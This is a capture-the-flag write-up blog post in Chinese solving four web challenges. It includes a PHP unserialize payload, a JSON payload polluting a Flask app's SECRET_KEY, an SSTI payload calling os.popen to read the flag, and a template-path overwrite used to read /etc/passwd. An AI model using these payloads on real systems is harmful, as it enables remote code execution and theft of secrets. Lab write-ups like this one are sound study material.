---
title: DSBCTF单身杯
date: 2026-03-19 11:21:55
tags:
index_img: https://i0.hdslb.com/bfs/article/4b6bfa9c7ec7af33001e968f28175f97f1cb238a.jpg@1256w_708h_!web-article-pic.avif
categories: CTF
---

## 好玩的PHP

```php
<?php
    error_reporting(0);
    highlight_file(__FILE__);

    class ctfshow {
        private $d = '';
        private $s = '';
        private $b = '';
        private $ctf = '';

        public function __destruct() {
            $this->d = (string)$this->d;
            $this->s = (string)$this->s;
            $this->b = (string)$this->b;

            if (($this->d != $this->s) && ($this->d != $this->b) && ($this->s != $this->b)) {
                $dsb = $this->d.$this->s.$this->b;

                if ((strlen($dsb) <= 3) && (strlen($this->ctf) <= 3)) {
                    if (($dsb !== $this->ctf) && ($this->ctf !== $dsb)) {
                        if (md5($dsb) === md5($this->ctf)) {
                            echo file_get_contents("/flag.txt");
                        }
                    }
                }
            }
        }
    }

    unserialize($_GET["dsbctf"]);
```

签到题，通过不同的数据类型可以绕过强比较(!==)

```php
<?php
class ctfshow {
    private $d = '1';
    private $s = '2';
    private $b = '3';
    private $ctf = 123;
}

$obj = new ctfshow();
$payload = urlencode(serialize($obj));
echo $payload;
```

## ezzz_ssti

单纯限制长度的ssti

[记一次SSTI长度限制绕过-先知社区](https://xz.aliyun.com/news/15869)

## ez_inject

提示了python原型链污染，这里需要自己测试污染的地方。注册账号的时候提交的是表单经过测试json数据也可以被解析，所以在这里污染SECRET_KEY，当然，非预期结依旧是直接修改静态目录

```json
{
    "username": "test",
    "password": "test",
    "__init__": {"__globals__": {"app": {"config": {"SECRET_KEY": "suny"}}}},
}
```

然后找到session并解码，不知道为啥我这里解不出来，没关系，前面的就够用了

![image-20260319113344917](https://gitee.com/bobrocket/img/raw/master/image-20260319113344917.png)

修改管理员，加密

![image-20260319113426904](https://gitee.com/bobrocket/img/raw/master/image-20260319113426904.png)

接下来就是过滤不是很严格的过滤了，把纳新赛的payload拿来稍作修改就好

```
(cycler['next']['__g''lobals__']['o''s']['p''open']('nl /f*'))['read']()
```

## 迷雾重重

这个题代码不太好审，放了一堆烟雾弹

```php
<?php

namespace app\controller;

use support\Request;
use support\exception\BusinessException;

class IndexController
{
    public function index(Request $request)
    {
        
        return view('index/index');
    }

    public function testUnserialize(Request $request){
        if(null !== $request->get('data')){
            $data = $request->get('data');
            unserialize($data);
        }
        return "unserialize测试完毕";
    }

    public function testJson(Request $request){
        if(null !== $request->get('data')){
            $data = json_decode($request->get('data'),true);
            if(null!== $data && $data['name'] == 'guest'){
                return view('index/view', $data);
            }
        }
        return "json_decode测试完毕";
    }

    public function testSession(Request $request){
        $session = $request->session();
        $session->set('username',"guest");
        $data = $session->get('username');
        return "session测试完毕 username: ".$data;

    }

    public function testException(Request $request){
        if(null != $request->get('data')){
            $data = $request->get('data');
            throw new BusinessException("业务异常 ".$data,3000);
        }
        return "exception测试完毕";
    }


}

```

类似于接口测试的功能

- 有 `unserialize` 反序列化入口 
- 有 `session` 里面部分内容不可控，不可写马 除非文件上传的进度`session`
- 而真正隐藏的漏洞点在 `testJson`

testJson解析了data的内容并且反馈给了view

![image-20260320190025881](https://gitee.com/bobrocket/img/raw/master/image-20260320190025881.png)

可以看到后边调用了 `$handler::render`函数来渲染

![image-20260320190118819](https://gitee.com/bobrocket/img/raw/master/image-20260320190118819.png)

这里extract直接覆盖变量，并且下面有文件包含`$__template_path__`，我们直接污染这个变量，使用filter链实现RCE

```
{"name":"guest","__template_path__":"/etc/passwd"}
```

![image-20260320190315056](https://gitee.com/bobrocket/img/raw/master/image-20260320190315056.png)

payload

```
{"name":"guest","__template_path__":"太长了这里不展示了"}
```

